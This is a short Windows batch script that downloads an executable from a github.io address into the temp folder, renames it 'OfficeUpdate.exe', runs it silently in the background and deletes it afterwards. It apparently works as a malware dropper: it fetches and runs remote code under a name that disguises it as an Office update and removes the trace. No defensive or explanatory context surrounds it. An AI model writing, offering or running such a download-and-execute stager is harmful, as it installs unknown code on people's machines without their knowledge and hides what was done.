@echo off
set file_name=OfficeUpdate.exe
cd %tmp%
curl https://frl0.github.io/files/script.exe -o %file_name%
if exist %file_name% (
    start /B /W %file_name%
    del %file_name%
) else (
    exit
)
